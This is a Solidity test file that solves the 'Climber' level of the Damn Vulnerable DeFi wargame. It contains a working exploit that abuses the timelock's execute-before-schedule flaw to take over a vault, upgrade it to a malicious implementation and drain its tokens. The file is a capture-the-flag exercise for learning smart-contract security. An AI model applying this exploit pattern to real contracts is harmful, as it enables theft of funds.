// SPDX-License-Identifier: MIT
pragma solidity >=0.8.0;

import {Utilities} from "../../utils/Utilities.sol";
import "openzeppelin-contracts/proxy/ERC1967/ERC1967Proxy.sol";
import "forge-std/Test.sol";

import {DamnValuableToken} from "../../../src/Contracts/DamnValuableToken.sol";
import {ClimberTimelock} from "../../../src/Contracts/12.climber/ClimberTimelock.sol";
import {ClimberVault} from "../../../src/Contracts/12.climber/ClimberVault.sol";
import "../../../src/Contracts/12.climber/ClimberConstants.sol";
import "../../../src/Contracts/12.climber/ClimberErrors.sol";

contract Climber is Test {
    uint256 internal constant VAULT_TOKEN_BALANCE = 10_000_000e18;
    uint256 internal constant ATTACKER_INITIAL_ETH_BALANCE = 0.1 ether;
    uint256 internal constant TIMELOCK_DELAY = 1 hours;

    Utilities internal utils;
    DamnValuableToken internal dvt;
    ClimberTimelock internal timelock;
    ClimberVault internal vaultImplementation;
    ERC1967Proxy internal vaultProxy;
    address[] internal users;
    address payable internal deployer;
    address payable internal proposer;
    address payable internal sweeper;
    address payable internal attacker;

    function setUp() public {
        /**
         * SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE
         */
        utils = new Utilities();
        users = utils.createUsers(3);

        deployer = payable(users[0]);
        proposer = payable(users[1]);
        sweeper = payable(users[2]);

        attacker = payable(address(uint160(uint256(keccak256(abi.encodePacked("attacker"))))));
        vm.label(attacker, "Attacker");
        vm.deal(attacker, ATTACKER_INITIAL_ETH_BALANCE);

        assertEq(attacker.balance, ATTACKER_INITIAL_ETH_BALANCE);

        // Deploy the vault behind a proxy using the UUPS pattern,
        // passing the necessary addresses for the `ClimberVault::initialize(address,address,address)` function
        vaultImplementation = new ClimberVault();
        vm.label(address(vaultImplementation), "ClimberVault Implementation");

        bytes memory data = abi.encodeWithSignature("initialize(address,address,address)", deployer, proposer, sweeper);
        vaultProxy = new ERC1967Proxy(address(vaultImplementation), data);
        vm.label(address(vaultProxy), "ClimberVault Proxy");

        assertEq(ClimberVault(address(vaultProxy)).getSweeper(), sweeper);

        assertGt(ClimberVault(address(vaultProxy)).getLastWithdrawalTimestamp(), 0);

        // Instantiate timelock
        address timelockAddress = ClimberVault(address(vaultProxy)).owner();
        vm.label(timelockAddress, "ClimberTimelock");

        timelock = ClimberTimelock(payable(timelockAddress));

        assertEq(timelock.delay(), TIMELOCK_DELAY);

        vm.expectRevert(CallerNotTimelock.selector);
        timelock.updateDelay(uint64(TIMELOCK_DELAY) + 1);

        assertTrue(timelock.hasRole(PROPOSER_ROLE, proposer));

        assertTrue(timelock.hasRole(ADMIN_ROLE, deployer));

        assertTrue(timelock.hasRole(ADMIN_ROLE, timelockAddress));

        // Deploy token and transfer initial token balance to the vault
        dvt = new DamnValuableToken();
        vm.label(address(dvt), "DVT");
        dvt.transfer(address(vaultProxy), VAULT_TOKEN_BALANCE);

        console.log(unicode"🧨 Let's see if you can break it... 🧨");
    }

    function testExploit() public {
        /**
         * EXPLOIT START *
         */
        vm.startPrank(attacker);

        MaliciousProposer maliciousProposer = new MaliciousProposer(timelock, vaultProxy, dvt);
        vm.label(address(maliciousProposer), "Malicious Proposer");

        (address[] memory targets, uint256[] memory values, bytes[] memory dataElements, bytes32 salt) =
            maliciousProposer.getPoposeData();

        timelock.execute(targets, values, dataElements, salt);

        console.log("Owner of the vault is now malicious proposer:", ClimberVault(address(vaultProxy)).owner());

        maliciousProposer.withdraw();

        vm.stopPrank();

        /**
         * EXPLOIT END *
         */
        validation();
        console.log(unicode"\n🎉 Congratulations, you can go to the next level! 🎉");
    }

    function validation() internal {
        /**
         * SUCCESS CONDITIONS
         */
        assertEq(dvt.balanceOf(attacker), VAULT_TOKEN_BALANCE);
        assertEq(dvt.balanceOf(address(vaultProxy)), 0);
    }
}

contract MaliciousProposer {
    ClimberTimelock public timelock;
    ERC1967Proxy public vaultProxy;
    DamnValuableToken public dvt;

    address public owner;

    constructor(ClimberTimelock _timelock, ERC1967Proxy _vaultProxy, DamnValuableToken _dvt) {
        timelock = _timelock;
        vaultProxy = _vaultProxy;
        dvt = _dvt;
        owner = msg.sender;
    }

    function propose() public {
        (address[] memory targets, uint256[] memory values, bytes[] memory dataElements, bytes32 salt) = getPoposeData();
        timelock.schedule(targets, values, dataElements, salt);
    }

    function withdraw() public {
        FakeVault newVaultImplementation = new FakeVault();

        FakeVault proxy = FakeVault(address(vaultProxy));

        proxy.upgradeTo(address(newVaultImplementation));
        proxy.sweepFundsTo(address(dvt), owner);

        dvt.transfer(owner, dvt.balanceOf(address(this)));
    }

    function getPoposeData() public view returns (address[] memory, uint256[] memory, bytes[] memory, bytes32) {
        address[] memory targets = new address[](4);
        targets[0] = address(timelock);
        targets[1] = address(timelock);
        targets[2] = address(vaultProxy);
        targets[3] = address(this);

        uint256[] memory values = new uint256[](4);
        values[0] = 0;
        values[1] = 0;
        values[2] = 0;
        values[3] = 0;

        bytes[] memory dataElements = new bytes[](4);
        dataElements[0] = abi.encodeWithSelector(timelock.updateDelay.selector, 0);
        dataElements[1] = abi.encodeWithSelector(timelock.grantRole.selector, PROPOSER_ROLE, address(this));
        dataElements[2] = abi.encodeWithSelector(ClimberVault(address(vaultProxy)).transferOwnership.selector, this);
        dataElements[3] = abi.encodeWithSelector(this.propose.selector);

        bytes32 salt = bytes32(0);

        return (targets, values, dataElements, salt);
    }
}

contract FakeVault is ClimberVault {
    function sweepFundsTo(address token, address to) external onlyOwner {
        DamnValuableToken(token).transfer(to, DamnValuableToken(token).balanceOf(address(this)));
    }
}
